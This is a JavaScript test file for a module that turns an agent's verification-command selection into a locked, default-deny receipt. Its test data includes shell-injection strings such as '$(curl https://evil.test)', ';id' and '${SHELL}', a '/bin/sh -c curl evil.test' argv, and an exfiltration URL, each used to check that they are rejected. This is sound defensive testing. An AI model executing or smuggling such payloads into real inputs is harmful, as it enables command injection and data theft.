import assert from 'node:assert/strict';
import { readFile } from 'node:fs/promises';
import test from 'node:test';

import { IDENTITY_DOMAIN, IDENTITY_LABELS } from '../mcp/v3/identity.mjs';
import { RunContractV1Error } from '../mcp/v3/run-manifest.mjs';
import {
  DEFAULT_ENVIRONMENT_RECEIPT,
  DEFAULT_MUTATION_RECEIPT,
  DEFAULT_NETWORK_RECEIPT,
  DEFAULT_RESOURCES_RECEIPT,
  DEFAULT_TIMEOUT_MS,
  VERIFICATION_POLICY_SCHEMA_ID,
  canonicalVerificationPolicyJsonV1,
  verificationCommandDigestV1,
  verificationPolicyDigestV1,
} from '../mcp/v3/trusted-verification-policy.mjs';
import {
  APPROVED_COMMAND_DIGEST_LABEL,
  APPROVED_VERIFICATION_COMMAND_SCHEMA_ID,
  APPROVED_VERIFICATION_COMMAND_VERSION,
  EXECUTABLE_CLOSURE_DIGEST_LABEL,
  approvedVerificationCommandDigestV1,
  canonicalApprovedVerificationCommandJsonV1,
  resolveApprovedVerificationCommandV1,
} from '../mcp/v3/approved-verification-command.mjs';
import {
  parameterizedRequest,
  typedRequest,
  validCommand,
  validParameterizedCommand,
  validPolicy,
  validRequest,
  validSelection,
  validTypedCommand,
  validTypedParameters,
} from './fixtures/r1-approved-verification-command-fixtures.mjs';

function errorOf(action, expectedPath) {
  try {
    action();
  } catch (error) {
    assert.ok(error instanceof RunContractV1Error, `expected RunContractV1Error, got ${error}`);
    if (expectedPath !== undefined) assert.equal(error.path, expectedPath);
    return error;
  }
  assert.fail('expected a typed RunContractV1Error');
}

test('schema identity is additive v1 and does not claim a 4.0.0 major', () => {
  assert.equal(APPROVED_VERIFICATION_COMMAND_SCHEMA_ID,
    'codex-co-engineer.approved-verification-command.v1');
  assert.equal(APPROVED_VERIFICATION_COMMAND_VERSION, 1);
  assert.equal(APPROVED_VERIFICATION_COMMAND_SCHEMA_ID.includes('4.0.0'), false);
  assert.equal(APPROVED_COMMAND_DIGEST_LABEL, IDENTITY_LABELS.VERIFICATION_COMMAND_PLAN);
  assert.equal(EXECUTABLE_CLOSURE_DIGEST_LABEL, IDENTITY_LABELS.VERIFICATION_EXECUTABLE_CLOSURE);
});

test('a valid Codex selection resolves to a frozen detached receipt', () => {
  const request = validRequest();
  const receipt = resolveApprovedVerificationCommandV1(request);
  assert.equal(Object.isFrozen(receipt), true);
  assert.equal(Object.isFrozen(receipt.argv), true);
  assert.equal(Object.isFrozen(receipt.parameters), true);
  assert.equal(receipt.schema, APPROVED_VERIFICATION_COMMAND_SCHEMA_ID);
  assert.equal(receipt.version, APPROVED_VERIFICATION_COMMAND_VERSION);
  assert.equal(receipt.command_id, 'unit-tests');
  assert.equal(receipt.executable, '/usr/bin/npm');
  assert.deepEqual(receipt.argv, ['test']);
  assert.deepEqual(receipt.parameters, {});
  request.selection.command_id = 'other';
  request.policy.commands[0].executable = '/bin/sh';
  assert.equal(receipt.command_id, 'unit-tests');
  assert.equal(receipt.executable, '/usr/bin/npm');
  assert.equal(Object.isFrozen(request), false);
  assert.throws(() => { receipt.command_id = 'mutated'; }, TypeError);
  assert.throws(() => { receipt.argv.push('injected'); }, TypeError);
});

test('parameterized domain and template expansion stay canonical', () => {
  const receipt = resolveApprovedVerificationCommandV1(parameterizedRequest());
  assert.equal(receipt.command_id, 'file-tests');
  assert.equal(receipt.parameters.file, 'spec.js');
  assert.deepEqual(receipt.argv, ['test', '--', 'spec.js']);
  assert.equal(receipt.executable, '/usr/bin/npm');
});

test('typed domains expand to exact argv tokens without coercion', () => {
  const receipt = resolveApprovedVerificationCommandV1(typedRequest());
  assert.equal(receipt.parameters.count, 2);
  assert.equal(receipt.parameters.ok, true);
  assert.equal(receipt.parameters.mode, 'ci');
  assert.equal(receipt.parameters.note, 'unit');
  assert.deepEqual(receipt.argv, [
    'run', '--file', 'spec.js', '--count', '2', '--ok', 'true',
    '--mode', 'ci', '--note', 'unit',
  ]);

  assert.equal(
    errorOf(() => resolveApprovedVerificationCommandV1(typedRequest({
      selection: { command_id: 'typed-run', parameters: validTypedParameters({ count: '2' }) },
    }))).code,
    'invalid_type',
  );
  assert.equal(
    errorOf(() => resolveApprovedVerificationCommandV1(typedRequest({
      selection: { command_id: 'typed-run', parameters: validTypedParameters({ ok: 'true' }) },
    }))).code,
    'invalid_type',
  );
  assert.equal(
    errorOf(() => resolveApprovedVerificationCommandV1(typedRequest({
      selection: { command_id: 'typed-run', parameters: validTypedParameters({ file: 1 }) },
    }))).code,
    'invalid_type',
  );
  assert.equal(
    errorOf(() => resolveApprovedVerificationCommandV1(typedRequest({
      selection: { command_id: 'typed-run', parameters: validTypedParameters({ mode: 'CI' }) },
    }))).code,
    'invalid_format',
  );
  assert.equal(
    errorOf(() => resolveApprovedVerificationCommandV1(typedRequest({
      selection: { command_id: 'typed-run', parameters: validTypedParameters({ count: 9 }) },
    }))).code,
    'out_of_range',
  );
  assert.equal(
    errorOf(() => resolveApprovedVerificationCommandV1(typedRequest({
      selection: {
        command_id: 'typed-run',
        parameters: validTypedParameters({ note: 'x'.repeat(33) }),
      },
    }))).code,
    'out_of_range',
  );
});

test('required, optional, and default semantics follow the P16A domain', () => {
  assert.equal(
    errorOf(() => resolveApprovedVerificationCommandV1(parameterizedRequest({
      selection: { command_id: 'file-tests' },
    }))).code,
    'missing_key',
  );
  assert.equal(
    errorOf(() => resolveApprovedVerificationCommandV1(parameterizedRequest({
      selection: { command_id: 'file-tests', parameters: {} },
    }))).code,
    'missing_key',
  );
  assert.equal(
    errorOf(() => resolveApprovedVerificationCommandV1(parameterizedRequest({
      selection: { command_id: 'file-tests', parameters: { file: 'spec.js', extra: 'nope' } },
    }))).code,
    'unknown_key',
  );
  const unused = validCommand({
    command_id: 'with-extra',
    argv_template: ['test', '{file}'],
    parameters: {
      file: { type: 'path_segment', max_bytes: 32 },
      tag: { type: 'enum', values: ['a', 'b'] },
    },
  });
  assert.equal(
    errorOf(() => resolveApprovedVerificationCommandV1({
      policy: validPolicy({ commands: [unused] }),
      selection: { command_id: 'with-extra', parameters: { file: 'spec.js' } },
    })).code,
    'missing_key',
  );
  const complete = resolveApprovedVerificationCommandV1({
    policy: validPolicy({ commands: [unused] }),
    selection: { command_id: 'with-extra', parameters: { file: 'spec.js', tag: 'b' } },
  });
  assert.equal(complete.parameters.tag, 'b');
  assert.deepEqual(complete.argv, ['test', 'spec.js']);

  const omittedParams = resolveApprovedVerificationCommandV1(validRequest({
    selection: { command_id: 'unit-tests' },
  }));
  assert.deepEqual(omittedParams.parameters, {});
});

test('canonical identity is deterministic across key order and fresh receipts', () => {
  const left = typedRequest();
  const right = {
    selection: {
      parameters: {
        ok: true,
        note: 'unit',
        mode: 'ci',
        file: 'spec.js',
        count: 2,
      },
      command_id: 'typed-run',
    },
    policy: {
      version: 1,
      commands: [validTypedCommand()],
      schema: VERIFICATION_POLICY_SCHEMA_ID,
    },
  };
  const leftReceipt = resolveApprovedVerificationCommandV1(left);
  const rightReceipt = resolveApprovedVerificationCommandV1(right);
  assert.equal(
    canonicalApprovedVerificationCommandJsonV1(left),
    canonicalApprovedVerificationCommandJsonV1(right),
  );
  assert.equal(leftReceipt.plan_identity.digest, rightReceipt.plan_identity.digest);
  assert.equal(leftReceipt.plan_identity.algorithm, 'sha256');
  assert.equal(leftReceipt.plan_identity.domain, IDENTITY_DOMAIN);
  assert.equal(leftReceipt.plan_identity.label, IDENTITY_LABELS.VERIFICATION_COMMAND_PLAN);
  assert.match(leftReceipt.plan_identity.digest, /^[0-9a-f]{64}$/u);
  assert.equal(
    approvedVerificationCommandDigestV1(left).digest,
    leftReceipt.plan_identity.digest,
  );
  assert.notEqual(leftReceipt, rightReceipt);
  assert.equal(
    leftReceipt.policy_identity.digest,
    verificationPolicyDigestV1(left.policy).digest,
  );
  assert.equal(
    leftReceipt.command_identity.digest,
    verificationCommandDigestV1(validTypedCommand()).digest,
  );
  assert.equal(
    leftReceipt.executable_closure_identity.label,
    IDENTITY_LABELS.VERIFICATION_EXECUTABLE_CLOSURE,
  );

  const other = resolveApprovedVerificationCommandV1(typedRequest({
    selection: {
      command_id: 'typed-run',
      parameters: validTypedParameters({ count: 3 }),
    },
  }));
  assert.notEqual(other.plan_identity.digest, leftReceipt.plan_identity.digest);
  assert.notEqual(other.executable_closure_identity.digest, leftReceipt.executable_closure_identity.digest);
});

test('policy identity binds the whole catalog, not only the selected command', () => {
  const single = resolveApprovedVerificationCommandV1(validRequest());
  const withExtra = resolveApprovedVerificationCommandV1(validRequest({
    policy: validPolicy({ commands: [validCommand(), validParameterizedCommand()] }),
  }));
  assert.equal(single.command_id, withExtra.command_id);
  assert.equal(single.command_identity.digest, withExtra.command_identity.digest);
  assert.notEqual(single.policy_identity.digest, withExtra.policy_identity.digest);
  assert.notEqual(single.plan_identity.digest, withExtra.plan_identity.digest);
  assert.equal(
    withExtra.policy_identity.digest,
    verificationPolicyDigestV1(validPolicy({
      commands: [validParameterizedCommand(), validCommand()],
    })).digest,
  );
});

test('absent P16A capabilities are inherited as exact default-deny receipts', () => {
  const receipt = resolveApprovedVerificationCommandV1(validRequest());
  assert.deepEqual(receipt.network, DEFAULT_NETWORK_RECEIPT);
  assert.equal(receipt.network.mode, 'deny');
  assert.deepEqual(receipt.network.hosts, []);
  assert.deepEqual(receipt.environment, DEFAULT_ENVIRONMENT_RECEIPT);
  assert.deepEqual(receipt.environment.entries, []);
  assert.deepEqual(receipt.mutation, DEFAULT_MUTATION_RECEIPT);
  assert.equal(receipt.mutation.persistent, false);
  assert.equal(receipt.mutation.workspace, 'none');
  assert.equal(receipt.timeout_ms, DEFAULT_TIMEOUT_MS);
  assert.deepEqual(receipt.resources, DEFAULT_RESOURCES_RECEIPT);
  assert.equal(receipt.network === DEFAULT_NETWORK_RECEIPT, false);
  assert.equal(receipt.environment === DEFAULT_ENVIRONMENT_RECEIPT, false);
});

test('owner-authored constraints are inherited and cannot be overridden', () => {
  const granted = validCommand({
    network: { mode: 'allowlist', hosts: ['ci.example.test', 'cache.example.test'] },
    environment: { entries: [{ name: 'CI', value: '1' }] },
    mutation: { persistent: false, workspace: 'ephemeral' },
    timeout_ms: 120_000,
    resources: { max_output_bytes: 4096, max_error_bytes: 1024 },
  });
  const receipt = resolveApprovedVerificationCommandV1({
    policy: validPolicy({ commands: [granted] }),
    selection: validSelection(),
  });
  assert.deepEqual(receipt.network.hosts, ['cache.example.test', 'ci.example.test']);
  assert.equal(receipt.environment.entries[0].name, 'CI');
  assert.equal(receipt.timeout_ms, 120_000);
  assert.equal(receipt.resources.max_output_bytes, 4096);

  assert.equal(
    errorOf(() => resolveApprovedVerificationCommandV1({
      policy: validPolicy({ commands: [granted] }),
      selection: { command_id: 'unit-tests', timeout_ms: 1 },
    })).code,
    'resource_limit_denied',
  );
  assert.equal(
    errorOf(() => resolveApprovedVerificationCommandV1({
      policy: validPolicy({ commands: [granted] }),
      selection: { command_id: 'unit-tests', environment: { entries: [] } },
    })).code,
    'executable_content_denied',
  );
  assert.equal(
    errorOf(() => resolveApprovedVerificationCommandV1({
      policy: validPolicy({ commands: [granted] }),
      selection: { command_id: 'unit-tests', network: { mode: 'allowlist' } },
    })).code,
    'network_content_denied',
  );
  assert.equal(
    errorOf(() => resolveApprovedVerificationCommandV1({
      policy: validPolicy({ commands: [granted] }),
      selection: { command_id: 'unit-tests', mutation: { persistent: true } },
    })).code,
    'mutation_permission_denied',
  );
});

test('missing policy, command, or authority default-deny', () => {
  assert.equal(errorOf(() => resolveApprovedVerificationCommandV1({})).code, 'missing_key');
  assert.equal(
    errorOf(() => resolveApprovedVerificationCommandV1({
      selection: validSelection(),
    })).code,
    'missing_key',
  );
  assert.equal(
    errorOf(() => resolveApprovedVerificationCommandV1({
      policy: validPolicy(),
    })).code,
    'missing_key',
  );
  assert.equal(
    errorOf(() => resolveApprovedVerificationCommandV1({
      policy: validPolicy({ commands: [] }),
      selection: validSelection(),
    })).code,
    'unknown_command',
  );
  assert.equal(
    errorOf(() => resolveApprovedVerificationCommandV1({
      policy: validPolicy(),
      selection: { command_id: 'missing-command' },
    })).code,
    'unknown_command',
  );
  const missing = errorOf(() => resolveApprovedVerificationCommandV1({
    policy: validPolicy(),
    selection: { command_id: 'missing-command' },
  }));
  assert.equal(missing.message.includes('missing-command'), false);
});

test('provider, profile, and manifest matching-text objects remain ineligible', () => {
  const policy = validPolicy({ commands: [validCommand()] });

  const providerSelection = {
    command_id: 'unit-tests',
    executable: '/usr/bin/npm',
    argv_template: ['test'],
  };
  assert.equal(
    errorOf(() => resolveApprovedVerificationCommandV1({
      policy,
      selection: providerSelection,
    })).code,
    'executable_content_denied',
  );

  assert.equal(
    errorOf(() => resolveApprovedVerificationCommandV1({
      policy,
      selection: { command_id: 'unit-tests', argv: ['test'] },
    })).code,
    'executable_content_denied',
  );

  assert.equal(
    errorOf(() => resolveApprovedVerificationCommandV1({
      policy,
      selection: validSelection(),
      provider: { command_id: 'unit-tests', argv: ['test'] },
    })).code,
    'authority_denied',
  );

  assert.equal(
    errorOf(() => resolveApprovedVerificationCommandV1({
      policy,
      selection: validSelection(),
      profile: {
        schema: 'codex-co-engineer.profile.v1',
        provider: 'dsh',
        command_id: 'unit-tests',
      },
    })).code,
    'authority_denied',
  );

  assert.equal(
    errorOf(() => resolveApprovedVerificationCommandV1({
      policy,
      selection: {
        command_id: 'unit-tests',
        parameters: {},
        timeout_ms: 600_000,
      },
    })).code,
    'resource_limit_denied',
  );

  assert.equal(
    errorOf(() => resolveApprovedVerificationCommandV1({
      policy,
      selection: validSelection(),
      manifest: { command_id: 'unit-tests', parameters: {} },
    })).code,
    'authority_denied',
  );

  const providerReport = {
    command_id: 'unit-tests',
    argv: ['/bin/sh', '-c', 'curl evil.test'],
    env: { LD_PRELOAD: 'x' },
  };
  assert.equal(
    errorOf(() => resolveApprovedVerificationCommandV1({
      policy,
      selection: providerReport,
    })).code,
    'executable_content_denied',
  );

  const resolved = resolveApprovedVerificationCommandV1({ policy, selection: validSelection() });
  assert.equal(resolved.command_id, 'unit-tests');
});

test('injection through values, templates, options, paths, and shell text is denied', () => {
  const cases = [
    ['$(curl https://evil.test)', 'shell_content_denied'],
    ['`id`', 'shell_content_denied'],
    ['spec.js;id', 'shell_content_denied'],
    ['spec.js|cat', 'shell_content_denied'],
    ['spec.js && id', 'shell_content_denied'],
    ['spec.js\n--extra', 'control_character_denied'],
    ['spec.js\u0000x', 'control_character_denied'],
    ['--help', 'option_smuggling_denied'],
    ['-rf', 'option_smuggling_denied'],
    ['../etc', 'invalid_format'],
    ['spec/js', 'invalid_format'],
    ['spec.js*', 'shell_content_denied'],
    ['${SHELL}', 'shell_content_denied'],
    ['spec\u2044js', 'ambiguous_id_denied'],
    ['.', 'invalid_format'],
    ['..', 'invalid_format'],
    ['foo bar', 'shell_content_denied'],
  ];
  for (const [file, code] of cases) {
    const error = errorOf(() => resolveApprovedVerificationCommandV1(parameterizedRequest({
      selection: { command_id: 'file-tests', parameters: { file } },
    })));
    assert.equal(error.code, code, file);
    if (file.length > 2) assert.equal(error.message.includes(file), false, file);
    assert.equal(error.message.includes('evil'), false, file);
    assert.equal(error.message.includes('https://'), false, file);
  }

  assert.equal(
    errorOf(() => resolveApprovedVerificationCommandV1(typedRequest({
      selection: {
        command_id: 'typed-run',
        parameters: validTypedParameters({ note: '--flag' }),
      },
    }))).code,
    'option_smuggling_denied',
  );
});

test('boolean and integer argv tokens stay canonical without option smuggling of strings', () => {
  const zero = resolveApprovedVerificationCommandV1(typedRequest({
    selection: {
      command_id: 'typed-run',
      parameters: validTypedParameters({ count: 0, ok: false }),
    },
  }));
  assert.deepEqual(zero.argv.slice(3, 7), ['--count', '0', '--ok', 'false']);
  assert.equal(
    errorOf(() => resolveApprovedVerificationCommandV1(typedRequest({
      selection: {
        command_id: 'typed-run',
        parameters: validTypedParameters({ count: -0 }),
      },
    }))).code,
    'invalid_type',
  );
});

test('caller objects are not mutated, frozen, or reused', () => {
  const request = parameterizedRequest();
  const originalFile = request.selection.parameters.file;
  const receipt = resolveApprovedVerificationCommandV1(request);
  assert.equal(Object.isFrozen(request), false);
  assert.equal(Object.isFrozen(request.policy), false);
  assert.equal(Object.isFrozen(request.selection), false);
  assert.equal(Object.isFrozen(request.selection.parameters), false);
  request.selection.parameters.file = 'mutated.js';
  request.policy.commands.push(validCommand({ command_id: 'other' }));
  assert.equal(receipt.parameters.file, originalFile);
  assert.equal(receipt.argv[2], 'spec.js');
  const again = resolveApprovedVerificationCommandV1(parameterizedRequest());
  assert.notEqual(receipt, again);
  assert.equal(receipt.plan_identity.digest, again.plan_identity.digest);
  assert.equal(
    canonicalVerificationPolicyJsonV1(request.policy).includes('file-tests'),
    true,
  );
});

test('failures are typed and content-free', () => {
  const secret = 'sk-attacker-secret-value';
  const error = errorOf(() => resolveApprovedVerificationCommandV1({
    policy: validPolicy(),
    selection: validSelection(),
    [secret]: `/usr/bin/${secret}`,
  }));
  assert.equal(error instanceof RunContractV1Error, true);
  assert.equal(typeof error.code, 'string');
  assert.equal(error.message.includes(secret), false);
  assert.equal(error.message.includes('/usr/bin'), false);
  assert.equal(String(error.path).includes(secret), false);
  assert.equal(error.message.includes('TypeError'), false);

  const urlError = errorOf(() => resolveApprovedVerificationCommandV1({
    policy: validPolicy(),
    selection: { command_id: 'unit-tests', url: 'https://evil.example/steal' },
  }));
  assert.equal(urlError.message.includes('https://'), false);
  assert.equal(urlError.message.includes('evil.example'), false);
  assert.equal(urlError.code, 'network_content_denied');
});

test('the module never claims command execution, PATH resolution, or network access', async () => {
  const source = await readFile(
    new URL('../mcp/v3/approved-verification-command.mjs', import.meta.url),
    'utf8',
  );
  assert.match(source, /never invokes a shell/u);
  assert.match(source, /never resolves PATH/u);
  assert.match(source, /does not implement the P16C runner/u);
  assert.doesNotMatch(source, /from 'node:child_process'/u);
  assert.doesNotMatch(source, /from 'node:fs'/u);
  assert.doesNotMatch(source, /from 'node:fs\/promises'/u);
  assert.doesNotMatch(source, /from 'node:net'/u);
  assert.doesNotMatch(source, /from 'node:http'/u);
  assert.doesNotMatch(source, /from 'node:dns'/u);
  assert.doesNotMatch(source, /from 'node:os'/u);
  assert.equal(source.includes('spawn('), false);
  assert.equal(source.includes('execFile('), false);
  assert.equal(source.includes('execSync('), false);
  assert.equal(source.includes('fetch('), false);
  assert.equal(source.includes('process.env'), false);
});
